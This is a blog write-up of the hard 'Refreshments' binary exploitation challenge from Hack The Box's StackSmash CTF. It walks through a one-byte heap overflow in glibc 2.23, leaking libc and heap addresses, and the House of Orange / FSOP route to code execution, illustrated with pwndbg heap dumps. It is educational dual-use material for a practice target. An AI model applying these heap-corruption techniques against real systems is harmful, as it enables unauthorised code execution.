Title: StackSmash CTF: Refreshments
Date: 2025-10-25
Category: Blog
Tags: Binary Exploitation, CTF, Cybersecurity, Hack The Box
Author: Matt Spraggs

Hack The Box ran a CTF earlier in the year based exclusively around binary
exploitation. [StackSmash
CTF](https://ctf.hackthebox.com/event/details/stacksmash-ctf-2538) contained six
challenges across two and a bit days.

This is a deep dive into Refreshments, rated hard for difficulty. I'd be lying
if I said I solved this challenge without help, but there's a few aspects to the
official write-up that aren't really covered anywhere, so I figured it might be
useful to document those here.

# The Challenge

As with all other challenges in StackSmash, Refreshments is a binary
exploitation challenge. Let's start with the usual binary analyses:

```shell-session
$ checksec refreshments
[*] './refreshments'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'./glibc/'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
$ ./glibc/ld-linux-x86-64.so.2 glibc/libc.so.6 | grep version
GNU C Library (GNU libc) stable release version 2.23, by Roland McGrath et al.
Compiled by GNU CC version 7.5.0.
    crypt add-on version 2.1 by Michael Glad and others
```

Okay, so the binary itself is pretty well hardened, but the version of glibc,
2.23, is quite old.

Running the binary, it looks like we have a few options:

<div class="highlight" style="background-color: #112;"><pre><span></span><code style="background-color: #112;"><span style="color: #eee;">$ ./refreshments</span>

<span class="go">⬜⬜⬜🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧⬜⬜⬜</span>
<span class="go">⬜⬜⬜🟧⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜🟧⬜⬜⬜</span>
<span class="go">⬜⬜⬜🟧⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜🟧⬜⬜⬜</span>
<span class="go">⬜⬜⬜🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧⬜⬜⬜</span>
<span class="go">⬜⬜🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧⬜⬜</span>
<span class="go">⬜🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧⬜</span>
<span class="go">🟧🟧🟧⬜🟧⬜🟧⬜🟧⬜🟧⬜⬜⬜🟧⬜⬜⬜🟧</span>
<span class="go">🟧🟧🟧⬜🟧⬜🟧⬜🟧⬜🟧⬜🟧🟧🟧⬜🟧🟧🟧</span>
<span class="go">🟧🟧🟧⬜🟧⬜🟧⬜🟧⬜🟧⬜🟧🟧🟧⬜⬜🟧🟧</span>
<span class="go">🟧⬜🟧⬜🟧⬜🟧⬜🟧⬜🟧⬜🟧🟧🟧⬜🟧🟧🟧</span>
<span class="go">🟧⬜⬜⬜🟧⬜⬜⬜🟧⬜🟧⬜⬜⬜🟧⬜⬜⬜🟧</span>
<span class="go">🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧</span>
<span class="go">🟧⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜🟧</span>
<span class="go">🟧⬜⬜⬛⬛⬜⬜⬜⬜⬜⬜⬜⬜⬜⬛⬛⬜⬜🟧</span>
<span class="go">🟧⬜⬛⬜⬛⬛⬜⬜⬜⬜⬜⬜⬜⬛⬜⬛⬛⬜🟧</span>
<span class="go">🟧⬜⬛⬛⬛⬛⬜⬜⬜⬜⬜⬜⬜⬛⬛⬛⬛⬜🟧</span>
<span class="go">🟧⬜🏻⬛⬛⬜⬜⬛⬜⬜⬜⬛⬜⬜⬛⬛🏻⬜🟧</span>
<span class="go">🟧⬜🏻🏻⬜⬜⬜⬜⬛⬛⬛⬜⬜⬜⬜🏻🏻⬜🟧</span>
<span class="go">🟧⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜🟧</span>
<span class="go">🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧</span>

<span style="color: #fa0;">It's too hot.. Drink a juice Jumpio.. Or 2.. Or 10!</span>

<span style="color: #fa0;">Menu: </span>

<span style="color: #fa0;">███████████████████████████</span>
<span style="color: #fa0;">█                         █</span>
<span style="color: #fa0;">█ 1. Fill  glass (0 / 10) █</span>
<span style="color: #fa0;">█ 2. Empty glass          █</span>
<span style="color: #fa0;">█ 3. Edit  glass          █</span>
<span style="color: #fa0;">█ 4. View  glass          █</span>
<span style="color: #fa0;">█ 5. Exit                 █</span>
<span style="color: #fa0;">█                         █</span>
<span style="color: #fa0;">███████████████████████████</span>

<span style="color: #fa0;">&gt;&gt;</span>
</code></pre></div>

Internally, most of the logic is kept within `main`, and the decompiled
[code](https://gist.github.com/mspraggs/8c738831690070dc199a7bebc01200d3)
reveals the following:

1. We can allocate a chunk 0x58 bytes in size by filling a glass, and we can do
   this up to sixteen times.
2. We can free a chunk by freeing a glass, and there is no trivial
   double-free or use-after-free (UAF) bug.
3. We can edit the payload associated with a chunk by editing a glass, and the
   code allows us to write 0x59 bytes, which means we have a one-byte heap
   overflow.
4. We can view the payload associated with a chunk by viewing the glass.

# Leaking Addresses

The one-byte heap overflow allows us to corrupt heap metadata. As a refresher,
chunks on the heap use the following layout:

```text
    +-----------+
    | prev_size |  <--- Size of previous chunk (if free).
    +-----------+
    | size      |  <--- Size of this chunk.
    +-----------+  <--- malloc returns a pointer to this memory location.
    | fd        |  <--- This is used as data if the chunk is in use.
    +-----------+
    | bk        |  <--- This is used as data if the chunk is in use.
    +-----------+
    | remaining |
    | data...   |
    |           |
    |           |
    |           |
```

Here `fd` and `bk` can be pointers to other unused heap chunks, and depending on
the size of the chunk, the glibc allocator may place freed chunks in either a
singly- or doubly-linked list. For this particular version of glibc and chunks
of this size, the allocator will place freed chunks in the fast bins and track
them via a singly-linked list.

We can overflow the data portion of a chunk by one byte, which means we can
corrupt the least significant byte of the next adjacent chunk in the heap:

```text
    +-----------+
    | prev_size |  <--- Size of previous chunk (if free).
    +-----------+
    | size      |
    +-----------+
    | data      |   | We can overflow our allocated chunk by one byte, which
    |           |   | allows us to modify the size field of the next chunk in
    |           |   | the heap.
    |           |   |
    |           |   |
    |           |   |
    +-----------+   |
    | size      |   v
    +-----------+
    | data      |
    |           |
```

Refreshments will allocate chunks 0x58 bytes in size. Adding in the chunk's
metadata, i.e. eight bytes of data for the size field, each chunk takes up 0x60
bytes. We can see this when we examine the heap in [pwndbg]():

<div class="highlight"><pre><code><span class="gp">pwndbg&gt;</span> vis

<span class="go">0x5bca8ba66000  0x0000000000000000      <span class="s1">0x0000000000000061</span>      ........a.......</span>
<span class="go">0x5bca8ba66010  <span class="s1">0x0000000000000000</span>      <span class="s1">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66020  <span class="s1">0x0000000000000000</span>      <span class="s1">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66030  <span class="s1">0x0000000000000000</span>      <span class="s1">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66040  <span class="s1">0x0000000000000000</span>      <span class="s1">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66050  <span class="s1">0x0000000000000000</span>      <span class="s1">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66060  <span class="s1">0x0000000000000000</span>      <span class="sx">0x0000000000000061</span>      ........a.......</span>
<span class="go">0x5bca8ba66070  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66080  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66090  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba660a0  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba660b0  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba660c0  <span class="sx">0x0000000000000000</span>      0x0000000000020f41      ........A.......         &lt;-- Top chunk</span>
</code></pre></div>

Here we have two chunks, one at address `0x5bca8ba66010` and the other at
address `0x5bca8ba66070`. Both chunks have a size field value of 0x61, where the
least significant bit is part of the
[AMP bits](https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/),
in this case indicating that the previous chunk is in use. We can overflow in
the size field, so we can trick the glibc heap implemetation into thinking that
these chunks are a different size to what was allocated. This is our main route
into exploiting the binary.

To start, we allocate four chunks and use the first chunk to overwrite the size
field of the second chunk to 0xc1. This tricks glibc into thinking that the
second chunk is 0xc0, or 192, bytes in size. We then free the second chunk,
tricking glibc into placing this larger chunk into an unsorted bin. The heap now
looks like this:

<div class="highlight"><pre><span></span><code><span class="gp">pwndbg&gt;</span> vis

<span class="go">0x5bca8ba66000  0x0000000000000000      <span class="s1">0x0000000000000061</span>      ........a.......</span>
<span class="go">0x5bca8ba66010  <span class="s1">0x4141414141414141</span>      <span class="s1">0x4141414141414141</span>      AAAAAAAAAAAAAAAA</span>
<span class="go">0x5bca8ba66020  <span class="s1">0x4141414141414141</span>      <span class="s1">0x4141414141414141</span>      AAAAAAAAAAAAAAAA</span>
<span class="go">0x5bca8ba66030  <span class="s1">0x4141414141414141</span>      <span class="s1">0x4141414141414141</span>      AAAAAAAAAAAAAAAA</span>
<span class="go">0x5bca8ba66040  <span class="s1">0x4141414141414141</span>      <span class="s1">0x4141414141414141</span>      AAAAAAAAAAAAAAAA</span>
<span class="go">0x5bca8ba66050  <span class="s1">0x4141414141414141</span>      <span class="s1">0x4141414141414141</span>      AAAAAAAAAAAAAAAA</span>
<span class="go">0x5bca8ba66060  <span class="s1">0x4141414141414141</span>      <span class="sx">0x00000000000000c1</span>      AAAAAAAA........         <-- unsortedbin[all][0]</span>
<span class="go">0x5bca8ba66070  <span class="sx">0x00007d4636d99b78</span>      <span class="sx">0x00007d4636d99b78</span>      x..6F}..x..6F}..</span>
<span class="go">0x5bca8ba66080  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66090  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba660a0  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba660b0  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba660c0  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000061</span>      ........a.......</span>
<span class="go">0x5bca8ba660d0  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba660e0  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba660f0  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66100  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66110  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66120  <span class="gt">0x00000000000000c0</span>      <span class="gt">0x0000000000000060</span>      ........a.......</span>
<span class="go">0x5bca8ba66130  <span class="gt">0x0000000000000000</span>      <span class="gt">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66140  <span class="gt">0x0000000000000000</span>      <span class="gt">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66150  <span class="gt">0x0000000000000000</span>      <span class="gt">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66160  <span class="gt">0x0000000000000000</span>      <span class="gt">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66170  <span class="gt">0x0000000000000000</span>      <span class="gt">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66180  <span class="gt">0x0000000000000000</span>      0x0000000000020e81      ........!.......         <-- Top chunk</span>
<span class="gp">pwndbg&gt;</span> telescope 0x00007d4636d99b78
<span class="go">00:0000│  0x7d4636d99b78 (main_arena+88) —▸ 0x6066557831e0 ◂— 0</span>
<span class="go">01:0008│  0x7d4636d99b80 (main_arena+96) ◂— 0</span>
<span class="go">02:0010│  0x7d4636d99b88 (main_arena+104) —▸ 0x5bca8ba66060 ◂— 0x4141414141414141 ('AAAAAAAA')</span>
<span class="go">03:0018│  0x7d4636d99b90 (main_arena+112) —▸ 0x5bca8ba66060 ◂— 0x4141414141414141 ('AAAAAAAA')</span>
<span class="go">04:0020│  0x7d4636d99b98 (main_arena+120) —▸ 0x7d4636d99b88 (main_arena+104) —▸ 0x5bca8ba66060 ◂— 0x4141414141414141 ('AAAAAAAA')</span>
<span class="go">05:0028│  0x7d4636d99ba0 (main_arena+128) —▸ 0x7d4636d99b88 (main_arena+104) —▸ 0x5bca8ba66060 ◂— 0x4141414141414141 ('AAAAAAAA')</span>
<span class="go">06:0030│  0x7d4636d99ba8 (main_arena+136) —▸ 0x7d4636d99b98 (main_arena+120) —▸ 0x7d4636d99b88 (main_arena+104) —▸ 0x5bca8ba66060 ◂— 0x4141414141414141 ('AAAAAAAA')</span>
<span class="go">07:0038│  0x7d4636d99bb0 (main_arena+144) —▸ 0x7d4636d99b98 (main_arena+120) —▸ 0x7d4636d99b88 (main_arena+104) —▸ 0x5bca8ba66060 ◂— 0x4141414141414141 ('AAAAAAAA')</span>
<span class="gp">pwndbg&gt;</span> bins
<span class="go">fastbins</span>
<span class="go">empty</span>
<span class="go">unsortedbin</span>
<span class="go">all: 0x5bca8ba66060 —▸ 0x7d4636d99b78 (main_arena+88) ◂— 0x5bca8ba66060 /* '`0xUf`' */</span>
<span class="go">smallbins</span>
<span class="go">empty</span>
<span class="go">largebins</span>
<span class="go">empty</span>
</code></pre></div>

In the process of freeing the chunk, glibc has populated the forward and back
pointers with a `main_arena` address. Since we have no explicit UAF bug, there's
no way to leak these pointers... yet.

To work around our lack of direct UAF, we can take advantage of another glibc
behaviour when allocating chunks. Normally, glibc uses a strategy called
[_first fit_](https://heap-exploitation.dhavalkapil.com/attacks/first_fit) to
locate a suitable chunk to serve a call to `malloc`. However, since we have a
single chunk in an unsorted bin larger than the 0x58 byte chunk size we can
allocate, glibc uses a technique called
["remaindering"](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=d20d5955db4d814b73a5b1829d1bc7874c94024d;hb=ab30899d880f9741a409cbc0d7a28399bdac21bf#l3487)
to reuse some of this unsorted bin chunk. The result is that the next call to
malloc will see the unsorted bin chunk split into two. The first half is used as
the chunk the caller of `malloc` asked for. The second is a shrunken version of
the unsorted bin chunk. In pwngdb, the heap now looks like this:

<div class="highlight"><pre><span></span><code><span class="gp">pwndbg&gt;</span> vis

<span class="go">0x5bca8ba66000  0x0000000000000000      <span class="s1">0x0000000000000061</span>      ........a.......</span>
<span class="go">0x5bca8ba66010  <span class="s1">0x4141414141414141</span>      <span class="s1">0x4141414141414141</span>      AAAAAAAAAAAAAAAA</span>
<span class="go">0x5bca8ba66020  <span class="s1">0x4141414141414141</span>      <span class="s1">0x4141414141414141</span>      AAAAAAAAAAAAAAAA</span>
<span class="go">0x5bca8ba66030  <span class="s1">0x4141414141414141</span>      <span class="s1">0x4141414141414141</span>      AAAAAAAAAAAAAAAA</span>
<span class="go">0x5bca8ba66040  <span class="s1">0x4141414141414141</span>      <span class="s1">0x4141414141414141</span>      AAAAAAAAAAAAAAAA</span>
<span class="go">0x5bca8ba66050  <span class="s1">0x4141414141414141</span>      <span class="s1">0x4141414141414141</span>      AAAAAAAAAAAAAAAA</span>
<span class="go">0x5bca8ba66060  <span class="s1">0x4141414141414141</span>      <span class="sx">0x0000000000000061</span>      AAAAAAAAa.......</span>
<span class="go">0x5bca8ba66070  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66080  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66090  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba660a0  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba660b0  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba660c0  <span class="sx">0x0000000000000000</span>      <span class="gt">0x0000000000000061</span>      ........a.......         <-- unsortedbin[all][0]</span>
<span class="go">0x5bca8ba660d0  <span class="gt">0x00007d4636d99b78</span>      <span class="gt">0x00007d4636d99b78</span>      x..6F}..x..6F}..</span>
<span class="go">0x5bca8ba660e0  <span class="gt">0x0000000000000000</span>      <span class="gt">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba660f0  <span class="gt">0x0000000000000000</span>      <span class="gt">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66100  <span class="gt">0x0000000000000000</span>      <span class="gt">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66110  <span class="gt">0x0000000000000000</span>      <span class="gt">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66120  <span class="cp">0x0000000000000060</span>      <span class="cp">0x0000000000000060</span>      ........a.......</span>
<span class="go">0x5bca8ba66130  <span class="cp">0x0000000000000000</span>      <span class="cp">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66140  <span class="cp">0x0000000000000000</span>      <span class="cp">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66150  <span class="cp">0x0000000000000000</span>      <span class="cp">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66160  <span class="cp">0x0000000000000000</span>      <span class="cp">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66170  <span class="cp">0x0000000000000000</span>      <span class="cp">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66180  <span class="cp">0x0000000000000000</span>      0x0000000000020e81      ........!.......         <-- Top chunk</span>
</code></pre></div>

By remaindering the fake unsorted bin chunk, glibc has inadvertently inserted
pointers to the `main_arena` into the third chunk! Since we can still view this
chunk (a pointer to its data still exists on the stack), we can leak this
pointer to the `main_arena` and by extension leak the glibc base address. (This
assumes that glibc's data and code segments are always located next to each
other in memory with the same relative offset. I didn't see anything to suggest
this won't be the case when working on this challenge.)

Knowing the glibc base is useful, because now we can bypass the
[position-independent executable](https://en.wikipedia.org/wiki/Position-independent_code#PIE)
(PIE) protections used by the binary. If we want to insert pointers to the heap
and forge fake chunks, we really need to leak heap addresses.

To achieve this, we can reuse some of the above process to free a second chunk
into the unsorted bin. The second time glibc frees a chunk into the unsorted
bins, the doubly-linked list used to track chunks in the bin will contain a
pointer to the first chunk we freed. We can then read this from the chunk as
before, leaking the heap address.

There's one small requirement we have to satisfy. We can overwrite the size
field of the second chunk as we did before, but when we free the chunk, glibc
will check the size field of the chunk _after_ our fake chunk to see whether the
AMP bits indicate the previous chunk is in use. In the pwndbg listing above,
this means the byte located at `0x5bca8ba66128`. Currently this byte has value
`0x60`, meaning the previous chunk is not in use. glibc will check this and
realise there's an inconsistency in the heap metadata, aborting execution.

So we need to set the byte at `0x5bca8ba66128` to `0x61`. Fortunately, our
one-byte overflow lets us do this. We also need to preserve the pointers at
`0x5bca8ba660d0` and `0x5bca8ba660d8`, since glibc will use these when
constructing the next unsorted bin entry. We've leaked these already, so we can
tweak the process above and do the following:

1. Overflow the first chunk to overwrite the size of the second chunk and set it
   to 0xc1.
2. Overflow the third chunk to overwrite the size of the fourth chunk and set it
   to 0x61, preserving the forward and backward pointers and the previous chunk
   size field.
3. Free the second chunk to place another chunk in the unsorted bin.
4. Read the third chunk to leak a pointer to the heap.

After this process, the heap looks like this:

<div class="highlight"><pre><span></span><code><span class="gp">pwndbg&gt;</span> vis

<span class="go">0x5bca8ba66000  0x0000000000000000      <span class="s1">0x0000000000000061</span>      ........a.......</span>
<span class="go">0x5bca8ba66010  <span class="s1">0x4141414141414141</span>      <span class="s1">0x4141414141414141</span>      AAAAAAAAAAAAAAAA</span>
<span class="go">0x5bca8ba66020  <span class="s1">0x4141414141414141</span>      <span class="s1">0x4141414141414141</span>      AAAAAAAAAAAAAAAA</span>
<span class="go">0x5bca8ba66030  <span class="s1">0x4141414141414141</span>      <span class="s1">0x4141414141414141</span>      AAAAAAAAAAAAAAAA</span>
<span class="go">0x5bca8ba66040  <span class="s1">0x4141414141414141</span>      <span class="s1">0x4141414141414141</span>      AAAAAAAAAAAAAAAA</span>
<span class="go">0x5bca8ba66050  <span class="s1">0x4141414141414141</span>      <span class="s1">0x4141414141414141</span>      AAAAAAAAAAAAAAAA</span>
<span class="go">0x5bca8ba66060  <span class="s1">0x4141414141414141</span>      <span class="sx">0x00000000000000c1</span>      AAAAAAAA........         <-- unsortedbin[all][0]</span>
<span class="go">0x5bca8ba66070  <span class="sx">0x00005bca8ba660c0</span>      <span class="sx">0x00007d4636d99b78</span>      .`...[..x..6F}..</span>
<span class="go">0x5bca8ba66080  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66090  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba660a0  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba660b0  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba660c0  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000061</span>      ........a.......         <-- unsortedbin[all][1]</span>
<span class="go">0x5bca8ba660d0  <span class="sx">0x00007d4636d99b78</span>      <span class="sx">0x00005bca8ba660c0</span>      x..6F}...`...[..</span>
<span class="go">0x5bca8ba660e0  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba660f0  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66100  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66110  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66120  <span class="gt">0x00000000000000c0</span>      <span class="gt">0x0000000000000060</span>      ........a.......</span>
<span class="go">0x5bca8ba66130  <span class="gt">0x0000000000000000</span>      <span class="gt">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66140  <span class="gt">0x0000000000000000</span>      <span class="gt">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66150  <span class="gt">0x0000000000000000</span>      <span class="gt">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66160  <span class="gt">0x0000000000000000</span>      <span class="gt">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66170  <span class="gt">0x0000000000000000</span>      <span class="gt">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66180  <span class="gt">0x0000000000000000</span>      0x0000000000020e81      ........!.......         <-- Top chunk</span>
</code></pre></div>

Having leaked glibc base and a pointer to the heap, we now need to make use of
these to gain control of execution.

# Getting a Shell

So I'll admit that at this point I got a bit stuck. To get execution control, we
typically need to be able to be able to modify some instruction address, such as
a function's return pointer, on the stack, or an entry in the global offset
table (GOT). This challenge focuses on heap exploitation, so it's unlikely that
we're expected to manipulate values on the stack[ref]We can overflow the stack,
as it turns out, since the sixteen chunks we can allocate are stored in a buffer
that exceeds the size of the `main` stack frame. We'd still have to leak the
stack canary though and trick `malloc` into returning an instruction address,
which in itself is a huge challenge given our primitives.[/ref].

There are some other locations we could try and overwrite, such as
`__malloc_hook` or `__free_hook`. I spent quite a bit of time digging into some
possibilities here, specifically around using
[unsafe-unlink](https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit)
or [fastbin
attacks](https://book.hacktricks.wiki/en/binary-exploitation/libc-heap/fast-bin-attack.html)
to write to these locations.

Ultimately though, neither approach worked. glibc 2.23 performs some
[rudimentary checks](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=d20d5955db4d814b73a5b1829d1bc7874c94024d;hb=ab30899d880f9741a409cbc0d7a28399bdac21bf#l1417)
on chunks to be unlinked that enforce the doubly-linked list invariant employed
by the allocator. In practice this means that the region of memory we want to
write to must point back to the chunk we're freeing, which raises the bar
significantly for any potential exploit.

Similarly, chunks allocated from the fastbins must have a size that corresponds
to glibc's
[expectations](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=d20d5955db4d814b73a5b1829d1bc7874c94024d;hb=ab30899d880f9741a409cbc0d7a28399bdac21bf#l3383)
based on the bin index. If, for example, we wanted to have `malloc` return the
location of `__free_hook` so that we can overwrite it with the address of
`system`, we'd also need the location of `__free_hook` to carry the correct size
metadata. This adds further complexity, and in my case further head ↔ brick wall
activity.

Feeling like I'd exxhausted my options, I snuck a look at the [official
write-up](https://github.com/hackthebox/stack-smash-2025/tree/master/Refreshments)
for Refreshments. It mentions [House of
Orange](https://guyinatuxedo.github.io/43-house_of_orange/house_orange_exp/index.html).
Pretty much every write-up I found of this technique describes an elaborate
dance where the glibc allocator is tricked into putting a portion of the top
chunk, the unused memory at the end of the heap, into the unsorted bin. This is
then used to leak glibc addresses and achieve a write to `_IO_list_all` via an
unlink attack on the unsorted bin.

All of this is really circumstantial setup for the core of House of Orange,
which centres around how glibc uses `_IO_list_all` when faced with errors during
heap allocation. When handling an allocation error, glibc calls
[`malloc_printerr`](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=d20d5955db4d814b73a5b1829d1bc7874c94024d;hb=ab30899d880f9741a409cbc0d7a28399bdac21bf#l4988),
which calls `abort`, which ultimately calls
[`_IO_flush_all_lockp`](https://sourceware.org/git/?p=glibc.git;a=blob;f=libio/genops.c;h=5803cbf04fb0f861381f7031dd570c0cb3b33d6e;hb=ab30899d880f9741a409cbc0d7a28399bdac21bf#l759).
This last function iterates through the linked list of `_IO_FILE` structures
pointed to by `_IO_list_all`. If a file structure satisfies certain conditions,
`_IO_flush_all_lockp` calls whatever code is pointed to by `__overflow` in the
file structure's
[vtable](https://sourceware.org/git/?p=glibc.git;a=blob;f=libio/libioP.h;h=8706af2d901a51a272175f20e9f2d1888094bb7a;hb=ab30899d880f9741a409cbc0d7a28399bdac21bf#l355).
_This_ is the path to code execution, so ultimately House of Orange is "just"
_file stream orientated programming_ (FSOP), but on steroids.

Code execution is great, but first we need to actually overwrite `_IO_list_all`
to point to a fake `_IO_FILE` structure. Fortunately for us, `malloc` will first
[process
chunks](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=d20d5955db4d814b73a5b1829d1bc7874c94024d;hb=ab30899d880f9741a409cbc0d7a28399bdac21bf#l3470) in the unsorted bin, unlinking these chunks in the process. This provides a vector that enables us to write to memory. Better still, if the allocation fails, `malloc` will call `malloc_printerr`, triggering our exploit.

Applying this to Refreshments, we first need to make sure we have enough space
on the heap to accommodate our fake file structure plus extra to give us room to
manipulate heap metadata. To that end, we'll allocate until we have six chunks,
or 576 bytes, on the heap. This will also ensure that all bins are empty. This
effectively gives us a blank slate on which to deploy our exploit. The heap now
looks like this:

<div class="highlight"><pre><span></span><code><span class="gp">pwndbg&gt;</span> vis

<span class="go">0x5bca8ba66000  0x0000000000000000      <span class="s1">0x0000000000000061</span>      ........a.......</span>
<span class="go">0x5bca8ba66010  <span class="s1">0x4141414141414141</span>      <span class="s1">0x4141414141414141</span>      AAAAAAAAAAAAAAAA</span>
<span class="go">0x5bca8ba66020  <span class="s1">0x4141414141414141</span>      <span class="s1">0x4141414141414141</span>      AAAAAAAAAAAAAAAA</span>
<span class="go">0x5bca8ba66030  <span class="s1">0x4141414141414141</span>      <span class="s1">0x4141414141414141</span>      AAAAAAAAAAAAAAAA</span>
<span class="go">0x5bca8ba66040  <span class="s1">0x4141414141414141</span>      <span class="s1">0x4141414141414141</span>      AAAAAAAAAAAAAAAA</span>
<span class="go">0x5bca8ba66050  <span class="s1">0x4141414141414141</span>      <span class="s1">0x4141414141414141</span>      AAAAAAAAAAAAAAAA</span>
<span class="go">0x5bca8ba66060  <span class="s1">0x4141414141414141</span>      <span class="sx">0x0000000000000061</span>      AAAAAAAa........</span>
<span class="go">0x5bca8ba66070  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66080  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66090  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba660a0  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba660b0  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba660c0  <span class="sx">0x0000000000000000</span>      <span class="gt">0x0000000000000061</span>      ........a.......</span>
<span class="go">0x5bca8ba660d0  <span class="gt">0x0000000000000000</span>      <span class="gt">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba660e0  <span class="gt">0x0000000000000000</span>      <span class="gt">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba660f0  <span class="gt">0x0000000000000000</span>      <span class="gt">0x0000000000000000</span>      ................</span>
